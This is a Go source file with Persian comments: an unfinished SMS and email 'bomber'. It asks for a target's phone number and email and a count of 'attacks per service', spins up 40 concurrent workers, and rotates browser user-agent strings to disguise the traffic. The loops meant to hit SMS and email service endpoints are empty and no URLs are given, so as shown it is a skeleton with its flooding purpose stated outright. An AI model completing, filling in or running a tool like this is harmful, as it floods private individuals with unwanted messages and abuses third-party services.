// is code testing...
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"math/rand"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
}

// =========================================================================================
// بخش جدید: لیست پیش‌شماره کشورها برای راهنمایی
// =========================================================================================
var countryCodes = map[string]string{
	"Afghanistan": "+93", "Albania": "+355", "Algeria": "+213", "American Samoa": "+1-684",
	"Andorra": "+376", "Angola": "+244", "Argentina": "+54", "Armenia": "+374", "Australia": "+61",
	"Austria": "+43", "Azerbaijan": "+994", "Bahamas": "+1-242", "Bahrain": "+973", "Bangladesh": "+880",
	"Belarus": "+375", "Belgium": "+32", "Bolivia": "+591", "Brazil": "+55", "Canada": "+1",
	"Chile": "+56", "China": "+86", "Colombia": "+57", "Congo": "+242", "Costa Rica": "+506",
	"Croatia": "+385", "Cuba": "+53", "Cyprus": "+357", "Czech Republic": "+420", "Denmark": "+45",
	"Egypt": "+20", "Estonia": "+372", "Ethiopia": "+251", "Finland": "+358", "France": "+33",
	"Georgia": "+995", "Germany": "+49", "Ghana": "+233", "Greece": "+30", "Hong Kong": "+852",
	"Hungary": "+36", "Iceland": "+354", "India": "+91", "Indonesia": "+62", "Iran": "+98",
	"Iraq": "+964", "Ireland": "+353", "Israel": "+972", "Italy": "+39", "Jamaica": "+1-876",
	"Japan": "+81", "Jordan": "+962", "Kazakhstan": "+7", "Kenya": "+254", "Kuwait": "+965",
	"Malaysia": "+60", "Mexico": "+52", "Netherlands": "+31", "New Zealand": "+64", "Nigeria": "+234",
	"North Korea": "+850", "Norway": "+47", "Oman": "+968", "Pakistan": "+92", "Palestine": "+970",
	"Peru": "+51", "Philippines": "+63", "Poland": "+48", "Portugal": "+351", "Qatar": "+974",
	"Romania": "+40", "Russia": "+7", "Saudi Arabia": "+966", "Singapore": "+65", "South Africa": "+27",
	"South Korea": "+82", "Spain": "+34", "Sweden": "+46", "Switzerland": "+41", "Syria": "+963",
	"Taiwan": "+886", "Thailand": "+66", "Turkey": "+90", "Turkmenistan": "+993", "Uganda": "+256",
	"Ukraine": "+380", "United Arab Emirates": "+971", "United Kingdom": "+44", "United States": "+1",
	"Uruguay": "+598", "Uzbekistan": "+998", "Venezuela": "+58", "Vietnam": "+84", "Yemen": "+967",
}

func showCountryCodes() {
	fmt.Println("\n\033[01;34m--- List of Common Country Codes ---")
	// برای سادگی فقط چند مورد نمایش داده می‌شود
	fmt.Println("Iran: +98, USA/Canada: +1, UK: +44, Germany: +49, Turkey: +90, UAE: +971")
	fmt.Println("For a full list, check the `countryCodes` map in the source code.")
	fmt.Println("\033[0m")
}

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// این توابع دقیقاً همان توابع کد اولیه شما هستند
func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()
	// ... کد این تابع بدون تغییر باقی می‌ماند
	if url == "" { ch <- -1; return } // اگر URL خالی بود، رد شو
	const maxRetries = 3
	for retry := 0; retry < maxRetries; retry++ {
		// ...
		jsonData, _ := json.Marshal(payload)
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil { continue }
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		resp, err := client.Do(req)
		if err == nil {
			ch <- resp.StatusCode
			resp.Body.Close()
			return
		}
	}
	ch <- http.StatusInternalServerError
}

func sendFormRequest(client *http.Client, ctx context.Context, urlStr string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()
	// ... کد این تابع بدون تغییر باقی می‌ماند
	if urlStr == "" { ch <- -1; return } // اگر URL خالی بود، رد شو
	const maxRetries = 3
	for retry := 0; retry < maxRetries; retry++ {
		// ...
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, urlStr, strings.NewReader(formData.Encode()))
		if err != nil { continue }
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		resp, err := client.Do(req)
		if err == nil {
			ch <- resp.StatusCode
			resp.Body.Close()
			return
		}
	}
	ch <- http.StatusInternalServerError
}

func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()
	// ... کد این تابع بدون تغییر باقی می‌ماند
	if url == "" { ch <- -1; return } // اگر URL خالی بود، رد شو
	const maxRetries = 3
	for retry := 0; retry < maxRetries; retry++ {
		// ...
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil { continue }
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		resp, err := client.Do(req)
		if err == nil {
			ch <- resp.StatusCode
			resp.Body.Close()
			return
		}
	}
	ch <- http.StatusInternalServerError
}


func main() {
	rand.Seed(time.Now().UnixNano())
	clearScreen()
	// بنر خودت را اینجا بگذار
	fmt.Println("... Your ASCII Art Banner ...")
	
	showCountryCodes()
	
	// --- بخش جدید: دریافت شماره تلفن و ایمیل ---
	var phone, email string
	fmt.Print("\033[01;32mEnter target phone with country code (e.g., +98912...): \033[00;36m")
	fmt.Scan(&phone)

	fmt.Print("\033[01;32mEnter target email (e.g., target@domain.com): \033[00;36m")
	fmt.Scan(&email)

	var repeatCount int
	fmt.Print("\033[01;32mEnter number of attacks per service: \033[00;36m")
	fmt.Scan(&repeatCount)
	
	// ... بخش انتخاب سرعت مثل کد خودت ...
	numWorkers := 40 // Default to medium

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-signalChan; cancel() }()

	client := &http.Client{Timeout: 10 * time.Second, Jar: nil}

	// تعیین یک اندازه بزرگ برای کانال‌ها
	tasks := make(chan func(), repeatCount*200) // 200 جایگاه برای API های آینده
	ch := make(chan int, repeatCount*200)

	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	// =========================================================================================
	// بخش اصلی: حلقه ایجاد وظایف با URL های خالی (آماده برای پر کردن)
	// =========================================================================================
	for i := 0; i < repeatCount; i++ {
		// --- وظایف مربوط به SMS (اگر شماره تلفن وارد شده باشد) ---
		if phone != "" {





		}

		// --- وظایف مربوط به Email (اگر ایمیل وارد شده باشد) ---
		if email != "" {






		}
	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()
	
	fmt.Println("\n[*] Starting attack... Press Ctrl+C to stop.")
	for statusCode := range ch {
		if statusCode >= 200 && statusCode < 300 {
			fmt.Println("\033[01;32m[+] Request Succeeded")
		} else if statusCode > 0 { // خطاهای HTTP
			fmt.Printf("\033[01;31m[-] Request Failed with status: %d\n", statusCode)
		}
		// اگر statusCode برابر با 0 (کنسل شده) یا -1 (URL خالی) بود، چیزی چاپ نمی‌کنیم
	}
	fmt.Println("\n\033[01;34m[*] Attack finished.\033[0m")
}
